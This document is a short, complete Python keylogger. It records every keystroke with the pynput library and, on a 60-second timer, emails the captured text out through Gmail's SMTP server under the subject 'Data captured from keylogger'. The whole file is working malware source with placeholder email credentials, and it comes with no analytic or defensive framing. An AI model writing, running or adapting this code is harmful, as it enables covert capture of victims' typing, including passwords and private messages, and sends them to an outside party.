from pynput import keyboard
import smtplib 
from email.mime.text import MIMEText
from threading import Timer

log = ""

sEmail = "example@mail.com"
dEmail = "example@mail.com"
passEmail = "examplePass"

def send_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Data captured from keylogger"
        msg['From'] = sEmail
        msg['To'] = dEmail

        try: 
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(sEmail, passEmail)
            server.send_message(msg)
            server.quit()

        except Exception as e:
            print("Send error", e)   

        log = ""     

    Timer(60, send_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:            
            log +="\n"
        elif key == keyboard.Key.backspace:
            log +="[<]" 
        else:
            pass  

with keyboard.Listener(on_press=on_press) as listener:
    send_email()
    listener.join()      